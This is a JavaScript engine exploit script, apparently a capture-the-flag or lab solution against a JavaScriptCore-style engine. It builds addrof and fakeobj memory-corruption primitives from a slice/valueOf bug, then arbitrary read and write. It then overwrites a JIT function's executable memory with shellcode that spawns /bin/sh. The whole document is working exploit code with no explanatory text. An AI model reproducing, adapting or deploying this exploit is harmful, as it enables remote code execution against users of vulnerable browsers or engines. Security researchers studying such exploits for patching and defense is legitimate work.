addrof = (obj) => {
	let arr = [];
	for(let i = 0; i < 100; i++)
		arr.push(i + 0.123);

	let x = arr.slice(0, {
		valueOf: () => {
			arr.length = 0;
			[obj];
			return 10;
		}
	}
	);

	return f2u(x[4]);
}

fakeobj = (addr) => {
	let arr = [[]];
	for(let i = 1; i < 100; i++)
		arr.push(i + 0.123);

	let x = arr.slice(0, {
		valueOf: () => {
			arr.length = 0;
			[u2f(addr)];
			return 10;
		}
	}
	);

	return x[4];
}

let spray = [];
for(let i = 0; i < 200; i++){
	let x = [1.1];
	x['spray'+i] = i;
	spray.push(x)
}
let victim = [1.1];
victim['target'] = 0;

let container = {
	header : u2f(0x0108210700000000 + 400), 
	butterfly : victim,
};
let addr_container = addrof(container);
let fake = fakeobj(addr_container + 0x10);

read64 = (addr) => {
	fake[1] = u2f(addr + 0x10);
	return addrof(victim.target);
}

write64 = (addr, value) => {
	fake[1] = u2f(addr + 0x10);
	//victim.target = (value >= 0x1000000000000 ? u2jsv : fakeobj)(value);
	victim.target = u2f(value);
}

function exploit(){
	function jit(){
		return [];
	}

	for(let i = 0; i < 10000; i++)
		jit();
	for(let i = 0; i < 4; i++)
		addrof(jit);

	let addr_function = addrof(jit);
	print(`[+] addr jit function : ${hex(addr_function)}`)
	let addr_executable = read64(addr_function + 0x18);
	print(`[+] addr executable   : ${hex(addr_executable)}`)
	let addr_JITCode = read64(addr_executable + 0x18);
	print(`[+] addr JITCode      : ${hex(addr_JITCode)}`)
	let addr_rwx = read64(addr_JITCode + 0x10);
	print(`[+] addr rwx area     : ${hex(addr_rwx)}`)

	let shellcode_str = `
	31 d2
	52
	48 ba 2f 2f 62 69 6e 2f 73 68
	52
	48 89 e7
	31 f6
	31 d2
	31 c0
	b0 3b
	0f 05
	`.replace(/(\r|\n|\s)/g,'');
	let shellcode = unhexlify(shellcode_str);

	payload = new Uint32Array(shellcode);
	for(let i = 0; i < payload.length; i++)
		write64(addr_rwx + 4*i, payload[i])

	print('[+] Go!')
	jit();
}

exploit();
